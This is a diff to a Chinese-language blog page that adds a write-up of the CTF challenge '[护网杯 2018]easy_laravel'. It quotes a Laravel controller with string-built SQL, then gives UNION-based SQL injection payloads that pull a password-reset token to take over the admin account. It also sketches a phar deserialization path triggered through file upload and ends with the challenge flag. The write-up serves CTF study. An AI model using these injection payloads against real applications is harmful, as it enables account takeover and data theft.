@@ -156,7 +156,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    4.1k 字
+                    4.4k 字
                   </span>
                 
 
@@ -166,7 +166,7 @@
                       <i class="iconfont icon-clock-fill"></i>
                     
                     
-                    71
+                    76
                      分钟
                   </span>
                 
@@ -763,6 +763,51 @@ Upgrade-Insecure-Requests: 1</code></pre>
 <p>访问木马:</p>
 <p><img src="https://s1.ax1x.com/2020/05/18/Yfkw5R.png" srcset="/img/loading.gif" alt="Yfkw5R.png"></p>
 <p><img src="https://s1.ax1x.com/2020/05/18/Yfkda9.png" srcset="/img/loading.gif" alt="Yfkda9.png"></p>
+<h2 id="护网杯-2018-easy-laravel"><a href="#护网杯-2018-easy-laravel" class="headerlink" title="[护网杯 2018]easy_laravel"></a>[护网杯 2018]easy_laravel</h2><p>复现参考:<a href="https://www.cnblogs.com/peri0d/p/12512343.html" target="_blank" rel="noopener">https://www.cnblogs.com/peri0d/p/12512343.html</a></p>
+<p><a href="https://skysec.top/2018/10/13/2018护网杯-web-writeup/#easy-laravel" target="_blank" rel="noopener">https://skysec.top/2018/10/13/2018%E6%8A%A4%E7%BD%91%E6%9D%AF-web-writeup/#easy-laravel</a></p>
+<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入:"></a>sql注入:</h3><p>查看控制器，发现明显注入</p>
+<pre><code class="hljs undefined">public function index(Note $note)
+&#123;
+    $username = Auth::user()-&gt;name;
+    $notes = DB::select(&quot;SELECT * FROM `notes` WHERE `author`=&apos;&#123;$username&#125;&apos;&quot;);
+    return view(&apos;note&apos;, compact(&apos;notes&apos;));
+&#125;</code></pre>
+
+<p>测试:</p>
+<pre><code class="hljs undefined">admin&apos; union select 1,2,3,4,5--</code></pre>
+
+<p>发现回显位为2</p>
+<p>可以在database文件夹发现        ‘email’ =&gt; ‘admin@qvq.im’,</p>
+<p>以及一些相关的表和列名，此处为token存放</p>
+<pre><code class="hljs undefined">public function up()
+&#123;
+    Schema::create(&apos;password_resets&apos;, function (Blueprint $table) &#123;
+        $table-&gt;string(&apos;email&apos;)-&gt;index();
+        $table-&gt;string(&apos;token&apos;)-&gt;index();
+        $table-&gt;timestamp(&apos;created_at&apos;)-&gt;nullable();
+    &#125;);
+&#125;</code></pre>
+
+<p>注入密码解不出来，利用laravel&lt;5.4 token为经过加密获取token充值管理员密码</p>
+<p>buuoj环境用#注释好像有点问题，建议用– </p>
+<pre><code class="hljs undefined">admin&apos; union select 1,(select email||&apos;::&apos;||token from password_resets limit 0,1),3,4,5--</code></pre>
+
+<p>获取token</p>
+<p><img src="https://s1.ax1x.com/2020/05/19/Y4dC8A.png" srcset="/img/loading.gif" alt="Y4dC8A.png"></p>
+<p>重置密码。</p>
+<p><img src="https://s1.ax1x.com/2020/05/19/Y4dPgI.png" srcset="/img/loading.gif" alt="Y4dPgI.png"></p>
+<h3 id="phar反序列化-1"><a href="#phar反序列化-1" class="headerlink" title="phar反序列化"></a>phar反序列化</h3><p>这里有几个解法，预期解试利用unlink删除blade模板缓存文件，</p>
+<p>非预期有个rce，利用call_user_func_array直接rce,参考非预期rce:<a href="https://xz.aliyun.com/t/2901" target="_blank" rel="noopener">https://xz.aliyun.com/t/2901</a> </p>
+<p>pop链的分析看大佬。</p>
+<p>由于buuoj环境不是nginx，是apache,注意一下路径问题</p>
+<pre><code class="hljs undefined">path=phar:////var/www/html/storage/app/public</code></pre>
+
+<p>上传phar，修改文件后缀为gif等，check发包file_exists触发phar反序列化</p>
+<p><a href="https://imgchr.com/i/Y4wYOP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/19/Y4wYOP.png" srcset="/img/loading.gif" alt="Y4wYOP.png"></a></p>
+<p>查看flag</p>
+<p><img src="https://s1.ax1x.com/2020/05/19/Y4d9Cd.png" srcset="/img/loading.gif" alt="Y4d9Cd.png"></p>
+<pre><code class="hljs undefined">flag&#123;581e34e4-08d6-42d5-ae01-8cc87a35a29a&#125;</code></pre>
+
 
             </article>
             <hr>
